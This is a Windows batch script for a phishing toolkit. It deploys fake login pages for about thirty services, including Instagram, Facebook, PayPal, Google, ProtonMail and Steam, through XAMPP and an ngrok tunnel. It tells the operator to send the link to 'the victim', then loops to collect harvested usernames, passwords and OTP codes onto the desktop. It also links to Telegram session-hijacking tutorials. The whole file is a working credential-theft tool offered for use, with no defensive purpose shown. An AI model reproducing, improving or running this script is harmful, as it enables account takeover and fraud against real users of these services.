@echo off
rem Coded BY Vignesh
rem GodOfDeath
:mine
dir C:\ | findstr "xampp" >nul
IF "%errorlevel%"=="0" (
    goto ngrok
) ELSE ( 
	color 4f
	echo Install Xampp And The Run Me.
	echo Download Xampp From Here ^>^>^> https://www.apachefriends.org/download.html
    echo Press Any Key To Exit....
	pause >nul
	goto exit
)
:ngrok
dir | findstr "ngrok" >nul
IF "%errorlevel%"=="0" (
    goto starts
) ELSE ( 
    color 4f
    echo Install Ngrok And The Run Me.
    echo Press Any Key To Download....
    pause >nul
    curl -o "ngrok.zip" https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip
    tar -xf ngrok.zip
    del ngrok.zip
    goto mine
)

:starts
color 0f
@mode con cols=85 lines=39
del _path_.txt >nul
echo %cd% >> _path_.txt
set /p path_o=<_path_.txt
:main
cls
rem Colors Code Starting
    For /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (set "DEL=%%a")
    Set "\C=For %%o in (1 2)Do if %%o==2 (( <nul set /p ".=%DEL%" > "^^!os:\n=^^!" ) & ( findstr /v /a:? /R "^$" "^^!os:\n=^^!" nul ) & ( del "^^!os:\n=^^!" > nul 2>&1 ) & (Set "testos=^^!os:\n=^^!" & If not "^^!testos^^!" == "^^!os^^!" (Echo/)))Else Set os="
    If Not "!![" == "[" (
     Set "\C=%\C:^^=^%"
    )
    Setlocal EnableExtensions EnableDelayedExpansion
    PUSHD "%~dp0"
rem Colors Code Ending
SET Connected=false
FOR /F "usebackq tokens=1" %%A IN (`PING google.com`) DO (
    IF /I "%%A"=="Reply" SET Connected=true
)

IF "%Connected%"=="true" (
    (%\C:?=af%Internet Is Connected.%\n)
) ELSE (
    (%\C:?=4f%Internet Is Not Connected.%\n)
)
echo.
(%\C:?=0e% [) & (%\C:?=04%01)&(%\C:?=0e%]) & (%\C:?=0b% Instagram%\n)
(%\C:?=0e% [) & (%\C:?=04%02)&(%\C:?=0e%]) & (%\C:?=0b% FaceBook%\n)
(%\C:?=0e% [) & (%\C:?=04%03)&(%\C:?=0e%]) & (%\C:?=0b% Whatsapp%\n)
(%\C:?=0e% [) & (%\C:?=04%04)&(%\C:?=0e%]) & (%\C:?=0b% Google%\n)
(%\C:?=0e% [) & (%\C:?=04%05)&(%\C:?=0e%]) & (%\C:?=0b% Blockchain%\n)
(%\C:?=0e% [) & (%\C:?=04%06)&(%\C:?=0e%]) & (%\C:?=0b% Github%\n)
(%\C:?=0e% [) & (%\C:?=04%07)&(%\C:?=0e%]) & (%\C:?=0b% Gitlab%\n)
(%\C:?=0e% [) & (%\C:?=04%08)&(%\C:?=0e%]) & (%\C:?=0b% Paypal%\n)
(%\C:?=0e% [) & (%\C:?=04%09)&(%\C:?=0e%]) & (%\C:?=0b% Snapchat%\n)
(%\C:?=0e% [) & (%\C:?=04%10)&(%\C:?=0e%]) & (%\C:?=0b% Wordpress%\n)
(%\C:?=0e% [) & (%\C:?=04%11)&(%\C:?=0e%]) & (%\C:?=0b% Twitter%\n)
(%\C:?=0e% [) & (%\C:?=04%12)&(%\C:?=0e%]) & (%\C:?=0b% Instagram_Verified_Badge%\n)
(%\C:?=0e% [) & (%\C:?=04%13)&(%\C:?=0e%]) & (%\C:?=0b% Instagram_Advanced_Attack%\n)
(%\C:?=0e% [) & (%\C:?=04%14)&(%\C:?=0e%]) & (%\C:?=0b% Google_Advanced_Attack%\n)
(%\C:?=0e% [) & (%\C:?=04%15)&(%\C:?=0e%]) & (%\C:?=0b% FaceBook_Fake_Security%\n)
(%\C:?=0e% [) & (%\C:?=04%16)&(%\C:?=0e%]) & (%\C:?=0b% PhonePay%\n)
(%\C:?=0e% [) & (%\C:?=04%17)&(%\C:?=0e%]) & (%\C:?=0b% Spotify%\n)
(%\C:?=0e% [) & (%\C:?=04%18)&(%\C:?=0e%]) & (%\C:?=0b% Stackoverflow%\n)
(%\C:?=0e% [) & (%\C:?=04%19)&(%\C:?=0e%]) & (%\C:?=0b% TikTok%\n)
(%\C:?=0e% [) & (%\C:?=04%20)&(%\C:?=0e%]) & (%\C:?=0b% ProtonMail%\n)
(%\C:?=0e% [) & (%\C:?=04%21)&(%\C:?=0e%]) & (%\C:?=0b% Adobe%\n)
(%\C:?=0e% [) & (%\C:?=04%22)&(%\C:?=0e%]) & (%\C:?=0b% Amazon%\n)
(%\C:?=0e% [) & (%\C:?=04%23)&(%\C:?=0e%]) & (%\C:?=0b% Reddit%\n)
(%\C:?=0e% [) & (%\C:?=04%24)&(%\C:?=0e%]) & (%\C:?=0b% Dropbox%\n)
(%\C:?=0e% [) & (%\C:?=04%25)&(%\C:?=0e%]) & (%\C:?=0b% Quora%\n)
(%\C:?=0e% [) & (%\C:?=04%26)&(%\C:?=0e%]) & (%\C:?=0b% Steam%\n)
(%\C:?=0e% [) & (%\C:?=04%27)&(%\C:?=0e%]) & (%\C:?=0b% Playstation%\n)
(%\C:?=0e% [) & (%\C:?=04%28)&(%\C:?=0e%]) & (%\C:?=0b% Pinterest%\n)
(%\C:?=0e% [) & (%\C:?=04%29)&(%\C:?=0e%]) & (%\C:?=0b% Ebay%\n)
(%\C:?=0e% [) & (%\C:?=04%30)&(%\C:?=0e%]) & (%\C:?=0b% Linkedin%\n)
(%\C:?=0e% [) & (%\C:?=04%31)&(%\C:?=0e%]) & (%\C:?=0b% IP_Finder%\n)
(%\C:?=0e% [) & (%\C:?=04%32)&(%\C:?=0e%]) & (%\C:?=0b% Xbox%\n)
(%\C:?=0e% [) & (%\C:?=04%33)&(%\C:?=0e%]) & (%\C:?=0b% Netflix%\n)
(%\C:?=0e% [) & (%\C:?=04%00)&(%\C:?=0e%]) & (%\C:?=0b% Telegram_Session_Hijacking_FUD%\n)
echo.
(%\C:?=0a% Choose An Option )
set /p main=$ 

echo.
if /i "%main%"== "1" goto Instagram
if /i "%main%" == "01" goto Instagram
if /i "%main%"== "2" goto FaceBook
if /i "%main%" == "02" goto FaceBook
IF /i "%main%"=="3" goto whatsapp
IF /i "%main%"=="03" goto whatsapp
IF /i "%main%"=="4" goto whatsapp
IF /i "%main%"=="04" goto whatsapp
IF /i "%main%"=="5" goto Blockchain
IF /i "%main%"=="05" goto Blockchain
IF /i "%main%"=="6" goto Github
IF /i "%main%"=="06" goto Github
IF /i "%main%"=="7" goto Gitlab
IF /i "%main%"=="07" goto Gitlab
IF /i "%main%"=="8" goto paypal
IF /i "%main%"=="08" goto paypal
IF /i "%main%"=="9" goto snapchat
IF /i "%main%"=="09" goto snapchat
IF /i "%main%"=="10" goto wordpress
IF /i "%main%"=="11" goto twitter
IF /i "%main%"=="12" goto Instagram_vb
IF /i "%main%"=="13" goto Instagram_ad
IF /i "%main%"=="14" goto Google_Advanced_Attack
IF /i "%main%"=="15" goto FaceBook_Fake_Security
IF /i "%main%"=="16" goto PhonePay
IF /i "%main%"=="17" goto Spotify
IF /i "%main%"=="18" goto Stackoverflow
IF /i "%main%"=="19" goto TikTok
IF /i "%main%"=="20" goto ProtonMail
IF /i "%main%"=="21" goto Adobe
IF /i "%main%"=="22" goto Amazon
IF /i "%main%"=="23" goto Reddit
IF /i "%main%"=="24" goto Dropbox
IF /i "%main%"=="25" goto Quora
IF /i "%main%"=="26" goto Steam
IF /i "%main%"=="27" goto Playstation
IF /i "%main%"=="28" goto Pinterest
IF /i "%main%"=="29" goto Ebay
IF /i "%main%"=="30" goto Linkedin
IF /i "%main%"=="31" goto IP_Finder
IF /i "%main%"=="32" goto Xbox
IF /i "%main%"=="33" goto Netflix
IF /i "%main%"=="00" goto Telegram_Session_Hijacking_FUD

echo Option Is Not found.
goto :main

:whatsapp
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy whatsapp "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Instagram
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy Instagram "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Google
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy google "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:FaceBook
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy facebook "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Blockchain
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy Blockchain "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Github
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy Github "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Gitlab
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy gitlab "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:paypal
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy paypal "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:snapchat
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy Snapchat "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:wordpress
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy wordpress "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:twitter
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy twitter "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Instagram_vb
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy Instagram_VerifiedBadge "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Instagram_ad
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy Instagram_advanced_attack "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Google_Advanced_Attack
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy google_advanced_web "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:FaceBook_Fake_Security
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy fb_security_fake "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:PhonePay
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy phonepay "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Spotify
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy spotify "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:PhonePay
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy phonepay "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Stackoverflow
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy stackoverflow "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:TikTok
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy tiktok "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:ProtonMail
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy protonmail "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Adobe
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy adobe "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Amazon
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy amazonsign "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Reddit
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy Reddit "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Dropbox
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy dropbox "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Quora
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy quora "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Steam
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy steam "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Playstation
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy playstation "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Pinterest
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy pinterest "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Ebay
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy ebay "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Linkedin
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy linkedin "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:IP_Finder
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy ipfinder "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Xbox
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy xbox "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Netflix
cls
cd Pages
rd "C:\xampp\htdocs" /s/q
mkdir C:\xampp\htdocs
xcopy Netflix "C:\xampp\htdocs" /s /e /y /i >nul
goto server

:Telegram_Session_Hijacking_FUD
start https://viralhacks.net/Telegram_Hijack_Tutorials_2
start https://viralhacks.net/Telegram_Hijack_Tutorials
goto main

:server
cd %path_o%
color 0a
echo Send Ngrok Link To The Victim(Eg : http://***.ngrok.io or https://***.ngrok.io).
start cmd /c "@mode con cols=79 lines=20 && C:\xampp\apache_start.bat"
start cmd /c "@mode con cols=79 lines=20 && ngrok http 80"
goto a

:a
cd C:\xampp\htdocs
if exist log.txt goto log
if exist usernames.txt goto log2
if exist Credentials.txt goto log3
goto a

:log
@mode con cols=79 lines=20
color 0a
(%\C:?=0e% Capturing Credentials....\n)
copy log.txt "%userprofile%/Desktop/Credentials.txt" >nul
type log.txt
timeout /t 02 /NOBREAK >nul
cls
goto log

:log2
@mode con cols=79 lines=20
color 0a
(%\C:?=0e% Capturing Credentials....\n)
copy usernames.txt "%userprofile%/Desktop/Credentials.txt" >nul
type usernames.txt
timeout /t 02 /NOBREAK >nul
cls
goto log2

:log3
@mode con cols=79 lines=20
color 0a
(%\C:?=0e% Capturing Credentials....\n)
copy Credentials.txt "%userprofile%/Desktop/Credentials.txt" >nul
copy otp.txt "%userprofile%/Desktop/Credentials_otp.txt" >nul
type Credentials.txt
type otp.txt
timeout /t 02 /NOBREAK >nul
cls
goto log3
